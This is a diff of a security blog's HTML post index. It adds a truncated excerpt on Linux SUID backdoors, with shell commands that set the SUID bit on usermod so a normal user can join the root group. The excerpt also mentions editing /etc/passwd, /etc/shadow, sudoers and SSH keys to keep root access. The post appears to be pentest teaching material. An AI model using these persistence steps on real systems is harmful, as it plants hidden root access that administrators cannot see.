@@ -84,6 +84,66 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/linux-suid-back-door/">Linux之SUID后门</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-04-18</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%90%8E%E9%97%A8">后门</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
+0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
+ vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
+ vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
+# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
+[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
+[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证
+    </p>
+
+    
+    <footer>
+        <a href="/posts/linux-suid-back-door/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/linux-user/">Linux之用户和用户组</a></h2>
 
         
@@ -594,61 +654,6 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/python-io-operation/">Python的IO操作</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-01-31</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/python">Python</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/python">python</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 文件的操作  文件读写  r读取；rb可以读取二进制文件(如图片、视频)；w可覆盖写入；a+可追加写入
-#!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&quot;test.txt&quot;,&quot;r&quot;) data = f.read() print &quot;File name: &quot;,f.name print &quot;File open moudle: &quot;,f.mode print &quot;File is close ?&quot;,f.closed print &quot;File content: &quot;,data finally: f.close() with open(&quot;test.txt&quot;,&quot;a+&quot;) as f: #自动调用close() data = &quot;\nYes,I know.&quot; f.write(data) print u&quot;写入内容：%s&quot; % data with open(&quot;test.txt&quot;,&quot;r&quot;) as f: #readlines()一次读取一行，返回一个列表，也可以用read(size)读取指定大小 line = f.readlines() print line   指针移动  #!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&quot;test.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/python-io-operation/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -710,7 +715,7 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(73)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(74)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -952,6 +957,11 @@ re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数su
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="http://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
                 <sup>1</sup>
             </p>
         
